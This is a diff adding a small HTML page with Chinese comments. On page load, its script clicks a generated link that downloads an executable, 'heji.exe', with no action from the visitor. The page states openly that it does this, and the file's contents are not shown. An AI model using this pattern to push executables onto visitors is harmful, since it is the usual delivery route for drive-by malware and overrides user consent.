@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Download</title>
+    <script type="text/javascript">
+        window.onload = function() {
+            var link = document.createElement('a');
+            link.href = 'heji.exe'; // 文件路径，可以根据需要调整
+            link.download = 'heji.exe'; // 设置下载文件的名称
+            link.click(); // 模拟点击下载
+        };
+    </script>
+</head>
+<body>
+    <h1>自动下载文件</h1>
+    <p>如果浏览器支持自动下载，heji.exe 会自动下载。</p>
+</body>
+</html>
